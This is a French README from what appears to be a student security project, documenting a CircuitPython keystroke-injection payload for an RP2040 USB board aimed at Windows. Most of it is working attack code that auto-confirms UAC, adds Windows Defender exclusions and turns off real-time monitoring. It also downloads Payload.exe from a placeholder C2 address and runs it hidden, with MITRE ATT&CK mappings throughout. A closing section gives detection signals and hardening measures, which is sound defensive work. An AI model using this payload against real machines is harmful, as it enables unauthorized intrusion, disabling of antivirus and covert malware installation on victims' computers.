# 🦆 Rubber Ducky — HID Injection Payload (CircuitPython / RP2040)

## 📋 Description

Ce script CircuitPython transforme une carte **RP2040** (format clé USB) en périphérique **HID Keyboard**. Une fois branché sur une machine cible Windows, il exécute automatiquement une séquence de frappes clavier simulant un utilisateur humain, en moins de **5 secondes**.

La chaîne d'exécution complète :
1. Ouvre une invite CMD via `Win+R`
2. Lance PowerShell avec privilèges administrateur
3. Valide automatiquement l'UAC
4. Crée un dossier dédié et l'ajoute aux exclusions Windows Defender
5. Télécharge un payload distant depuis le serveur C2
6. L'exécute en mode furtif (`-WindowStyle Hidden`)
7. Ferme toutes les fenêtres ouvertes

---

## 🔧 Prérequis matériel & logiciel

### Matériel
| Composant | Détails |
|---|---|
| Carte | **RP2040 USB** (format clé USB standard) |
| OS cible | Windows 10 / 11 (disposition clavier FR) |
| Connexion | Port USB-A direct |

### Dépendances CircuitPython
```
circuitpython >= 8.x
adafruit_hid >= 6.0.0
  ├── adafruit_hid/keyboard.py
  ├── adafruit_hid/keycode_win_fr.py          ← layout AZERTY Windows FR
  └── adafruit_hid/keyboard_layout_win_fr.py
```

> Toutes les librairies sont disponibles sur le [Bundle Adafruit CircuitPython](https://github.com/adafruit/Adafruit_CircuitPython_Bundle). Copier le dossier `adafruit_hid/` dans le répertoire `/lib` du périphérique.

---

## 📁 Structure du périphérique

```
CIRCUITPY (D:\)
│
├── code.py                  ← Ce fichier (point d'entrée automatique)
│
└── lib/
    └── adafruit_hid/
        ├── __init__.mpy
        ├── keyboard.mpy
        ├── keyboard_layout_win_fr.mpy
        └── keycode_win_fr.mpy
```

> CircuitPython exécute automatiquement `code.py` à chaque branchement du périphérique.

---

## 🔬 Analyse technique du code

### Initialisation HID

```python
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)
time.sleep(2)              # Attente de la reconnaissance HID par l'OS
```

Le délai de 2 secondes est critique : il laisse le temps au système d'exploitation de reconnaître et d'initialiser le périphérique comme clavier légitime avant d'envoyer les premières frappes.

---

### Étape 1 — Ouverture CMD via Win+R

```python
def win_run(command, delay=0.5):
    kbd.press(Keycode.GUI, Keycode.R)   # Raccourci Win+R → boîte Exécuter
    kbd.release_all()
    time.sleep(delay)
    layout.write(command)               # Saisit la commande caractère par caractère
    kbd.press(Keycode.ENTER)
    kbd.release_all()

win_run("cmd", delay=0.6)
time.sleep(1.5)                         # Attente de l'ouverture de la fenêtre CMD
```

**Pourquoi `delay=0.6` ?** Un délai trop court ne laisse pas le temps à la boîte `Exécuter` de s'ouvrir sur des machines plus lentes.

---

### Étape 2 — Élévation PowerShell (UAC Bypass)

```python
layout.write('powershell -Command "Start-Process powershell -Verb RunAs"')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# Navigation dans la fenêtre UAC : flèche gauche sélectionne "Oui"
kbd.press(Keycode.LEFT_ARROW)
kbd.release_all()
time.sleep(0.3)
kbd.press(Keycode.ENTER)
kbd.release_all()
```

`-Verb RunAs` déclenche une élévation UAC. La validation est automatisée via une pression de touche : sur la boîte UAC Windows, `←` suivi de `Entrée` confirme l'élévation.

> **Technique MITRE :** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control

---

### Étape 3 — Préparation de l'environnement

```python
layout.write("cd c:\\")         # Naviguer à la racine C:\
layout.write("mkdir games")     # Créer C:\games (nom discret)
layout.write("cd games")        # Se positionner dans le dossier
```

Le dossier `C:\games` est choisi pour son apparence anodine aux yeux d'un utilisateur non averti.

---

### Étape 4 — Désactivation Windows Defender

```python
# Ajouter le dossier aux exclusions AV
layout.write('Add-MpPreference -ExclusionPath "C:\\games"')

# Exclure le processus du payload
layout.write('Add-MpPreference -ExclusionProcess "Payload.exe"')

# Désactiver la protection en temps réel
layout.write('Set-MpPreference -DisableRealtimeMonitoring $true')
```

Ces trois commandes sont exécutées **avant** le téléchargement du payload pour éviter sa suppression automatique par Defender.

> **Technique MITRE :** T1562.001 — Impair Defenses: Disable or Modify Tools

---

### Étape 5 — Téléchargement & exécution du payload

```python
# Téléchargement via alias wget (alias de Invoke-WebRequest dans PowerShell)
layout.write("wget http://IP_OF_C2/Payload.exe -O Payload.exe")

# Exécution en arrière-plan, fenêtre cachée
layout.write('Start-Process "C:\\games\\Payload.exe" -WindowStyle Hidden')
```

`-WindowStyle Hidden` empêche l'apparition d'une fenêtre visible par l'utilisateur. Le payload se connecte ensuite au serveur C2 Mythic.

> **Techniques MITRE :** T1105 (Ingress Tool Transfer) + T1036 (Masquerading)

---

### Étape 6 — Nettoyage des traces visuelles

```python
layout.write("exit")    # Ferme PowerShell admin
layout.write("exit")    # Ferme CMD
```

Toutes les fenêtres ouvertes pendant l'attaque sont fermées. Sur une machine sans utilisateur présent, l'attaque est indétectable à l'œil nu.

---

## ⏱️ Timeline d'exécution

```
T+0.0s  → Branchement USB, reconnaissance HID
T+2.0s  → Début de l'exécution du script
T+2.6s  → Win+R → "cmd" → Entrée
T+4.1s  → Lancement PowerShell admin
T+5.1s  → Validation UAC automatique
T+6.1s  → Création dossier C:\games
T+7.6s  → Exclusions Defender ajoutées + RT Monitoring désactivé
T+9.6s  → Téléchargement Payload.exe
T+10.6s → Exécution Payload.exe (mode hidden)
T+11.6s → Fermeture des fenêtres
```

**Temps total d'exécution visible : ~10 secondes**

---

## 🗺️ Mapping MITRE ATT&CK

| Étape | Technique | ID |
|---|---|---|
| Reconnaissance HID | Hardware Additions | T1200 |
| Ouverture CMD/PowerShell | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Validation UAC automatique | Abuse Elevation Control Mechanism | T1548.002 |
| Exclusion Defender | Impair Defenses: Disable or Modify Tools | T1562.001 |
| Téléchargement payload | Ingress Tool Transfer | T1105 |
| Exécution cachée | Hide Artifacts: Hidden Window | T1564.003 |
| Fermeture fenêtres | Obfuscated Files or Information | T1027 |

---

## 🛡️ Détection (Blue Team)

### Règles Sigma disponibles
Voir le dossier [`../detection/sigma_rules/`](../detection/sigma_rules/) pour les règles de détection associées à ce script.

### Signaux d'alerte à monitorer

| Signal | Outil de détection |
|---|---|
| Périphérique HID inconnu branché | Sysmon Event ID 6416 |
| `powershell.exe` enfant de `cmd.exe` avec `-Verb RunAs` | Sysmon Event ID 1 |
| `Add-MpPreference -ExclusionPath` en ligne de commande | Windows Defender Event ID 5007 |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Windows Defender Event ID 5001 |
| Connexion réseau depuis `%TEMP%` ou `C:\games\` | Sysmon Event ID 3 |
| `wget` (alias `Invoke-WebRequest`) vers IP publique inconnue | Proxy / NGFW logs |

### Mesures de durcissement recommandées
- **Whitelister les périphériques HID** autorisés via GPO (Device Installation Restrictions)
- **Activer Tamper Protection** dans Windows Defender (empêche la modification via PowerShell)
- **Monitorer les Event ID 5001/5007** de Windows Defender dans le SIEM
- **Restreindre l'accès USB** sur les postes sensibles (BIOS + politique organisationnelle)

---


---

*Projet annuel 5e année — ESGI Paris 2025-2026 | Abdou DEMBELE & Flabou DIAKITE*
